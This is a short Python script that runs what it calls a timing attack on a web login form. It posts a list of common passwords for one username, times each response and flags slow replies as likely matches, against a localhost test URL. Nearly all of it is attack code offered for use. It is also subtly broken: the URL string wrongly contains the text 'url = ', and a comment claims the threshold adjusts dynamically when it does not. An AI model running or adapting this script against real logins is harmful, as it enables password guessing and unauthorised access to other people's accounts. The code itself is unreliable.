import aiohttp
import asyncio
import time
import logging

# Configure logging
logging.basicConfig(filename="timing_attack.log", level=logging.INFO, format="%(asctime)s - %(message)s")

# Function to measure response time using asynchronous requests
async def measure_response_time(session, url, payload):
    try:
        start_time = time.perf_counter()
        async with session.post(url, data=payload) as response:
            await response.text()  # Read response to ensure full request execution
        end_time = time.perf_counter()
        elapsed_time = end_time - start_time
        return elapsed_time, response.status
    except Exception as e:
        logging.error(f"Error: {e}")
        return None, None

# Function to perform the timing attack
async def timing_attack(url, username, password_list, threshold=0.1):
    async with aiohttp.ClientSession() as session:
        for password in password_list:
            payload = {"username": username, "password": password}
            elapsed_time, status = await measure_response_time(session, url, payload)
            
            if elapsed_time and status:
                logging.info(f"Password: {password} | Time: {elapsed_time:.6f}s | Status: {status}")
                print(f"Password: {password} | Time: {elapsed_time:.6f}s | Status: {status}")
                
                # Dynamically adjust threshold for better accuracy
                if elapsed_time > threshold:
                    print(f"Potential match: {password} (Time: {elapsed_time:.6f}s)")
                    logging.info(f"Potential match: {password}")
            else:
                print(f"Failed to test password: {password}")
                logging.warning(f"Failed to test password: {password}")

# Main function to configure and run the attack
if __name__ == "__main__":
    # Configuration
    url = "url = http://127.0.0.1:5000/login"
  # Replace with your test server URL
    username = "test_user"
    password_list = ["1234", "password", "admin", "letmein", "test123", "qwerty"]
    
    # Run the attack
    print("Starting timing attack...")
    asyncio.run(timing_attack(url, username, password_list, threshold=0.2))
    print("Timing attack completed. Check 'timing_attack.log' for details.")
